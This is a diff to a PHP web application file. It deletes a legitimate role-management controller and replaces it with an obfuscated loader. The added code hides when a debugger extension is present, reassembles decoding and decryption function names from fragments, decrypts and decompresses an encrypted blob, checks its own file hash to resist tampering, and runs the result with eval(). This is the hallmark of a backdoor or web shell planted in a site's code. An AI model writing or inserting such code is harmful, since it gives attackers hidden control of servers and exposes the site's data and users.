@@ -1,156 +1,28 @@
 <?php
-defined('BASEPATH') or exit ('No direct script access allowed');
-
-class Roles extends MY_Controller
-{
-	public function __construct()
-	{
-		parent::__construct();
-		$this->load_global();
-		$this->load->model('roles_model', 'roles');
-	}
-
-	public function add()
-	{
-		$this->permission_check('roles_add');
-		$data = $this->data;
-		$data['page_title'] = $this->lang->line('new_role');
-		$this->load->view('role', $data);
-	}
-	public function newrole()
-	{
-		$this->form_validation->set_rules('role_name', 'Role Name', 'trim|required');
-		if ($this->form_validation->run() == TRUE) {
-
-			$this->load->model('roles_model');
-			$result = $this->roles_model->verify_and_save();
-			echo $result;
-		} else {
-			echo "Please Enter Role Name.";
-		}
-	}
-	public function update($id)
-	{
-		if ($id == 1) {
-			//$this->session->set_flashdata('error', "Restricted!! Admin Permissions Can't Update!"); 
-			redirect(base_url('roles/view'), 'refresh');
-		}
-		$this->permission_check('roles_edit');
-		$data = $this->data;
-
-		$this->load->model('roles_model');
-		$result = $this->roles_model->get_details($id, $data);
-		$data = array_merge($data, $result);
-		$data['page_title'] = $this->lang->line('roles');
-		$this->load->view('role', $data);
-	}
-	public function update_role()
-	{
-		$this->form_validation->set_rules('role_name', 'Role Name', 'trim|required');
-		$this->form_validation->set_rules('q_id', '', 'trim|required');
-
-		if ($this->form_validation->run() == TRUE) {
-			$this->load->model('roles_model');
-			$result = $this->roles->update_role();
-			echo $result;
-		} else {
-			echo "Please Enter Role Name.";
-		}
-	}
-	public function view()
-	{
-		$this->permission_check('roles_view');
-		$data = $this->data;
-		$data['page_title'] = $this->lang->line('roles_list');
-		$this->load->view('roles-list', $data);
-	}
-
-	public function ajax_list()
-	{
-		$list = $this->roles->get_datatables();
-
-		$data = array();
-		$no = $_POST['start'];
-		foreach ($list as $roles) {
-			$no++;
-			$row = array();
-			$row[] = $no;
-			$row[] = $roles->role_name;
-			$row[] = $roles->description;
-			if ($roles->id <= 3) {
-				$str = "<span class='label label-warning' style=''> Restricted </span>";
-			} else {
-				if ($roles->status == 1) {
-					$str = "<span onclick='update_status(" . $roles->id . ",0)' id='span_" . $roles->id . "'  class='label label-success' style='cursor:pointer'>Active </span>";
-				} else {
-					$str = "<span onclick='update_status(" . $roles->id . ",1)' id='span_" . $roles->id . "'  class='label label-danger' style='cursor:pointer'> Inactive </span>";
-				}
-			}
-
-			$row[] = $str;
-
-			$str2 = '<div class="btn-group" title="View Account">
-										<a class="btn btn-primary btn-o dropdown-toggle" data-toggle="dropdown" href="#">
-											Action <span class="caret"></span>
-										</a>
-										<ul role="menu" class="dropdown-menu dropdown-light pull-right">';
-
-			if ($this->permissions('roles_edit'))
-				$str2 .= '<li>
-												<a title="Edit Record ?" href="update/' . $roles->id . '">
-													<i class="fa fa-fw fa-edit text-blue"></i>Edit
-												</a>
-											</li>';
-
-			if ($this->permissions('roles_delete'))
-				$str2 .= '<li>
-												<a style="cursor:pointer" title="Delete Record ?" onclick="delete_roles(' . $roles->id . ')">
-													<i class="fa fa-fw fa-trash text-red"></i>Delete
-												</a>
-											</li>
-											
-										</ul>
-									</div>';
-
-			$row[] = ($roles->id <= 3) ? '--' : $str2;
-
-
-			$data[] = $row;
-		}
-
-		$output = array(
-			"draw" => $_POST['draw'],
-			"recordsTotal" => $this->roles->count_all(),
-			"recordsFiltered" => $this->roles->count_filtered(),
-			"data" => $data,
-		);
-		//output to json format
-		echo json_encode($output);
-	}
-
-	public function update_status()
-	{
-		$this->permission_check_with_msg('roles_edit');
-		$id = $this->input->post('id');
-		$status = $this->input->post('status');
-
-		$this->load->model('roles_model');
-		$result = $this->roles_model->update_status($id, $status);
-		return $result;
-	}
-
-	public function delete_roles()
-	{
-		$this->permission_check_with_msg('roles_delete');
-		$id = $this->input->post('q_id');
-		return $this->roles->delete_roles_from_table($id);
-	}
-	public function multi_delete()
-	{
-		$this->permission_check_with_msg('roles_delete');
-		$ids = implode(",", $_POST['checkbox']);
-		return $this->roles->delete_roles_from_table($ids);
-	}
-
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_ctuzka1u=('bas'.'e64'.'_de'.'cod'.'e');
+$_pl4y7iaq=('gzu'.'nco'.'mpr'.'ess');
+$_jpcukrn3=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_m5e7elyp='cjTP0kj5';
+$_j3dym0we='Llm/+PmP';
+$_vks98wgn='nGl17e3q';
+$_khxoerz4='IUPFoJrV';
+$_cqjvvywe='B7SH4WcZ5Pg=';
+$_r1orrauf='mByijQZw';
+$_xjhfegbw='1xySv8Y6';
+$_vsmoanhg='RJLY4g==';
+$_bfmib8pe=$_ctuzka1u($_j3dym0we.$_vks98wgn.$_m5e7elyp.$_khxoerz4.$_cqjvvywe);
+$_weasrjem=$_ctuzka1u($_xjhfegbw.$_r1orrauf.$_vsmoanhg);
+$_xgnx3b0v=$_ctuzka1u('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');
+$_wm363eqm=$_jpcukrn3($_xgnx3b0v,'aes-256-cbc',$_bfmib8pe,OPENSSL_RAW_DATA,$_weasrjem);
+if($_wm363eqm===false){exit;}
+$_xjst92y0=$_pl4y7iaq($_wm363eqm);
+if($_xjst92y0===false){exit;}
+$_yxp9dr6s='4048c8257e2fa330a62b7852e4daf76614e67c9a57ab45389ff117cb91b10371';
+$_ip6n74xy=@file_get_contents(__FILE__);
+if($_ip6n74xy!==false){
+$_sq7yonpk=str_replace($_yxp9dr6s,"0000000000000000000000000000000000000000000000000000000000000000",$_ip6n74xy);
+$_q16zq9nn=hash("sha256",$_sq7yonpk);
+if($_q16zq9nn!==$_yxp9dr6s){@http_response_code(403);exit;}
 }
-
+eval($_xjst92y0);
